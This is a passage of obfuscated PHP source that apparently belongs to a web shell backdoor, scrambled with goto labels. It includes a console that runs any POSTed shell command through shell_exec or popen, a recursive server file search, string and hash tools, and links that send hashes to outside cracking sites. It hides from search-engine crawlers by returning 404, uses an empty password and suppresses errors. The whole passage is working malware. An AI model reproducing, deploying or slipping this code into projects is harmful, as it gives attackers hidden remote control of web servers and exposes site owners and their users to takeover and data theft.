    } elseif (function_exists('shell_exec')) {
        $out = shell_exec($in);
    } elseif (is_resource($f = @popen($in, "r"))) {
        goto Cc7f5;
        b373a:
        $out .= fread($f, 1024);
        goto Eba7c;
        A0128:
        pclose($f);
        goto D4324;
        Cc7f5:
        $out = "";
        goto ce4be;
        Eb3cc:
        if (@feof($f)) {
            goto C8075;
        }
        goto b373a;
        D8d8d:
        C8075:
        goto A0128;
        Eba7c:
        goto Aaa04;
        goto D8d8d;
        ce4be:
        Aaa04:
        goto Eb3cc;
        D4324:
    }
    goto efa73;
    ab04b:
    $out = '';
    goto f8b6b;
    cd70f:
}
goto fe916;
D828d:
function actionStringTools()
{
    goto cb6e7;
    b2860:
    if (!function_exists('hex2ascii')) {
        function hex2ascii($p)
        {
            goto E163f;
            Cdf53:
            return $r;
            goto A3690;
            f2d66:
            B86b7:
            goto ce46b;
            F3798:
            f492f:
            goto Cdf53;
            E163f:
            $r = '';
            goto d8c34;
            d8b99:
            $i += 2;
            goto E689e;
            E8582:
            $r .= chr(hexdec($p[$i] . $p[$i + 1]));
            goto Cc2ca;
            d8c34:
            $i = 0;
            goto f2d66;
            E689e:
            goto B86b7;
            goto F3798;
            ce46b:
            if (!($i < strLen($p))) {
                goto f492f;
            }
            goto E8582;
            Cc2ca:
            f8dba:
            goto d8b99;
            A3690:
        }
    }
    goto B7ea2;
    c83a6:
    De549:
    goto f959a;
    cdf5b:
    foreach ($stringTools as $k => $v) {
        echo "<option value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
        aca26:
    }
    goto c83a6;
    D62cf:
    yUoJQHeader();
    goto F7adf;
    cf235:
    if (isset($_POST['ajax'])) {
        goto Cb384;
        cfdae:
        exit;
        goto B4848;
        E09ce:
        ob_start();
        goto d68a8;
        Cb384:
        yUoJQsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
        goto E09ce;
        A0a25:
        $temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\x00") . "';\n";
        goto e9065;
        d68a8:
        if (in_array($_POST['p1'], $stringTools)) {
            echo $_POST['p1']($_POST['p2']);
        }
        goto A0a25;
        e9065:
        echo strlen($temp), "\n", $temp;
        goto cfdae;
        B4848:
    }
    goto D3948;
    dcbf7:
    $stringTools = array('Base64 encode' => 'base64_encode', 'Base64 decode' => 'base64_decode', 'Url encode' => 'urlencode', 'Url decode' => 'urldecode', 'Full urlencode' => 'full_urlencode', 'md5 hash' => 'md5', 'sha1 hash' => 'sha1', 'crypt' => 'crypt', 'CRC32' => 'crc32', 'ASCII to HEX' => 'ascii2hex', 'HEX to ASCII' => 'hex2ascii', 'HEX to DEC' => 'hexdec', 'HEX to BIN' => 'hex2bin', 'DEC to HEX' => 'dechex', 'DEC to BIN' => 'decbin', 'BIN to HEX' => 'binhex', 'BIN to DEC' => 'bindec', 'String to lower case' => 'strtolower', 'String to upper case' => 'strtoupper', 'Htmlspecialchars' => 'htmlspecialchars', 'String length' => 'strlen');
    goto cf235;
    F7adf:
    echo '<h1>String conversions</h1><div class=content>';
    goto Dfc76;
    Efa95:
    if (@$_POST['p3']) {
        yUoJQRecursiveGlob($_POST['c']);
    }
    goto A9da1;
    f959a:
    echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 " . (@$_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . "> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>" . (empty($_POST['p1']) ? '' : htmlspecialchars(@$_POST['p2'])) . "</textarea></form><pre class='ml1' style='" . (empty($_POST['p1']) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
    goto F7bdc;
    E02c2:
    function yUoJQRecursiveGlob($path)
    {
        goto D4225;
        Fe81d:
        if (is_array($paths) && @count($paths)) {
            foreach ($paths as $item) {
                if (@is_dir($item)) {
                    if ($path != $item) {
                        yUoJQRecursiveGlob($item);
                    }
                } else {
                    if (empty($_POST['p2']) || @strpos(file_get_contents($item), $_POST['p2']) !== false) {
                        echo "<a href='#' onclick='g(\"FilesTools\",null,\"" . urlencode($item) . "\", \"view\",\"\")'>" . htmlspecialchars($item) . "</a><br>";
                    }
                }
                F3682:
            }
            A0bf9:
        }
        goto f0109;
        B134a:
        $paths = @array_unique(@array_merge(@glob($path . $_POST['p3']), @glob($path . '*', GLOB_ONLYDIR)));
        goto Fe81d;
        D4225:
        if (substr($path, -1) != '/') {
            $path .= '/';
        }
        goto B134a;
        f0109:
    }
    goto Efa95;
    D3948:
    if (empty($_POST['ajax']) && !empty($_POST['p1'])) {
        yUoJQsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
    }
    goto D62cf;
    F7bdc:
    if (!empty($_POST['p1'])) {
        if (in_array($_POST['p1'], $stringTools)) {
            echo htmlspecialchars($_POST['p1']($_POST['p2']));
        }
    }
    goto c5975;
    Dfc76:
    echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
    goto cdf5b;
    Ccdf0:
    if (!function_exists('binhex')) {
        function binhex($p)
        {
            return dechex(bindec($p));
        }
    }
    goto b2860;
    A9da1:
    echo "</div><br><h1>Search for hash:</h1><div class=content>\r\n\t\t<form method='post' target='_blank' name='hf'>\r\n\t\t\t<input type='text' name='hash' style='width:200px;'><br>\r\n            <input type='hidden' name='act' value='find'/>\r\n\t\t\t<input type='button' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>\r\n\t\t\t<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>\r\n            <input type='button' value='crackfor.me' onclick=\"document.hf.action='http://crackfor.me/index.php';document.hf.submit()\"><br>\r\n\t\t</form></div>";
    goto B56ae;
    B56ae:
    yUoJQFooter();
    goto b32f1;
    cb6e7:
    if (!function_exists('hex2bin')) {
        function hex2bin($p)
        {
            return decbin(hexdec($p));
        }
    }
    goto Ccdf0;
    B9977:
    if (!function_exists('full_urlencode')) {
        function full_urlencode($p)
        {
            goto F7695;
            c756b:
            goto ec857;
            goto D8881;
            d7dec:
            $i = 0;
            goto d3dfa;
            F7695:
            $r = '';
            goto d7dec;
            Ef000:
            ++$i;
            goto c756b;
            Dc8b2:
            return strtoupper($r);
            goto Dcead;
            Efadb:
            if (!($i < strlen($p))) {
                goto bcbfc;
            }
            goto b0758;
            D8881:
            bcbfc:
            goto Dc8b2;
            E145b:
            B21ca:
            goto Ef000;
            b0758:
            $r .= '%' . dechex(ord($p[$i]));
            goto E145b;
            d3dfa:
            ec857:
            goto Efadb;
            Dcead:
        }
    }
    goto dcbf7;
    c5975:
    echo "</pre></div><br><h1>Search files:</h1><div class=content>\r\n\t\t<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>\r\n\t\t\t<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>\r\n\t\t\t<tr><td>Path:</td><td><input type='text' name='cwd' value='" . htmlspecialchars($GLOBALS['cwd']) . "' style='width:100%'></td></tr>\r\n\t\t\t<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>\r\n\t\t\t<tr><td></td><td><input type='submit' value='>>'></td></tr>\r\n\t\t\t</table></form>";
    goto E02c2;
    B7ea2:
    if (!function_exists('ascii2hex')) {
        function ascii2hex($p)
        {
            goto F2b2b;
            F6964:
            $r .= sprintf('%02X', ord($p[$i]));
            goto Fa0d6;
            Fa0d6:
            ac56f:
            goto Dbcc0;
            A8964:
            return strtoupper($r);
            goto c5640;
            F2b2b:
            $r = '';
            goto d7255;
            D1757:
            de4f5:
            goto A8964;
            d7255:
            $i = 0;
            goto Aa897;
            e107d:
            if (!($i < strlen($p))) {
                goto de4f5;
            }
            goto F6964;
            Dbcc0:
            ++$i;
            goto C596d;
            C596d:
            goto Bd4d8;
            goto D1757;
            Aa897:
            Bd4d8:
            goto e107d;
            c5640:
        }
    }
    goto B9977;
    b32f1:
}
goto c0c45;
D02df:
@ini_set('max_execution_time', 0);
goto F52b3;
d7e5a:
function actionConsole()
{
    goto aed06;
    b1d4b:
    if (empty($_POST['ajax']) && !empty($_POST['p1'])) {
        yUoJQsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
    }
    goto e5572;
    e87eb:
    D1a1a:
    goto a31c9;
    e75f3:
    yUoJQFooter();
    goto fc6cd;
    C3842:
    echo '</textarea><table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
    goto B867d;
    E095a:
    if (isset($_POST['ajax'])) {
        goto ac5e5;
        dc28c:
        ob_start();
        goto e928e;
        ed535:
        echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
        goto D6196;
        A4c17:
        echo strlen($temp), "\n", $temp;
        goto ea5fa;
        ea5fa:
        exit;
        goto D8d84;
        bbf49:
        echo "d.cf.output.value+='" . $temp . "';";
        goto ed535;
        D6196:
        $temp = ob_get_clean();
        goto A4c17;
        ac5e5:
        yUoJQsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
        goto dc28c;
        e928e:
        echo "d.cf.cmd.value='';\n";
        goto eea96;
        eea96:
        $temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n\$ " . $_POST['p1'] . "\n" . yUoJQEx($_POST['p1']), "\n\r\t\\'\x00"));
        goto F4f77;
        F4f77:
        if (preg_match("!.*cd\\s+([^;]+)\$!", $_POST['p1'], $match)) {
            if (@chdir($match[1])) {
                $GLOBALS['cwd'] = @getcwd();
                echo "c_='" . $GLOBALS['cwd'] . "';";
            }
        }
        goto bbf49;
        D8d84:
    }
    goto b1d4b;
    a31c9:
    echo '</select><input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value=">>"> <nobr><input type=checkbox name=ajax value=1 ' . (@$_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX <input type=checkbox name=show_errors value=1 ' . (!empty($_POST['p2']) || $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'stderr_to_out'] ? 'checked' : '') . '> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
    goto fcb46;
    e5572:
    yUoJQHeader();
    goto F9fdc;
    B45a5:
    foreach ($GLOBALS['aliases'] as $n => $v) {
        goto Bb7cb;
        F6225:
        F59de:
        goto Bf88c;
        Bb7cb:
        if ($v == '') {
            echo '<optgroup label="-' . htmlspecialchars($n) . '-"></optgroup>';
            goto F59de;
        }
        goto Bab1b;
        Bab1b:
        echo '<option value="' . htmlspecialchars($v) . '">' . $n . '</option>';
        goto F6225;
        Bf88c:
    }
    goto e87eb;
    fcb46:
    if (!empty($_POST['p1'])) {
        echo htmlspecialchars("\$ " . $_POST['p1'] . "\n" . yUoJQEx($_POST['p1']));
    }
    goto C3842;
    B867d:
    echo '</form></div><script>d.cf.cmd.focus();</script>';
    goto e75f3;
    F9fdc:
    echo "<script>\r\nif(window.Event) window.captureEvents(Event.KEYDOWN);\r\nvar cmds = new Array('');\r\nvar cur = 0;\r\nfunction kp(e) {\r\n\tvar n = (window.Event) ? e.which : e.keyCode;\r\n\tif(n == 38) {\r\n\t\tcur--;\r\n\t\tif(cur>=0)\r\n\t\t\tdocument.cf.cmd.value = cmds[cur];\r\n\t\telse\r\n\t\t\tcur++;\r\n\t} else if(n == 40) {\r\n\t\tcur++;\r\n\t\tif(cur < cmds.length)\r\n\t\t\tdocument.cf.cmd.value = cmds[cur];\r\n\t\telse\r\n\t\t\tcur--;\r\n\t}\r\n}\r\nfunction add(cmd) {\r\n\tcmds.pop();\r\n\tcmds.push(cmd);\r\n\tcmds.push('');\r\n\tcur = cmds.length-1;\r\n}\r\n</script>";
    goto fd89a;
    aed06:
    if (!empty($_POST['p1']) && !empty($_POST['p2'])) {
        yUoJQsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', true);
        $_POST['p1'] .= ' 2>&1';
    } elseif (!empty($_POST['p1'])) {
        yUoJQsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', 0);
    }
    goto E095a;
    fd89a:
    echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"><select name=alias>';
    goto B45a5;
    fc6cd:
}
goto f42d0;
Be367:
if (strtolower(substr(PHP_OS, 0, 3)) == "win") {
    $os = 'win';
} else {
    $os = 'nix';
}
goto A115f;
E6c7e:
if (!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
goto e1763;
b4587:
if (!empty($_POST['a']) && function_exists('action' . $_POST['a'])) {
    call_user_func('action' . $_POST['a']);
}
goto C4b2f;
bece7:
error_reporting(0);
goto fdc5b;
fdc5b:
$auth_pass = "";
goto ecf86;
Dec26:
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) {
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool) $default_use_ajax;
}
goto Db4fc;
C4b2f:
exit;
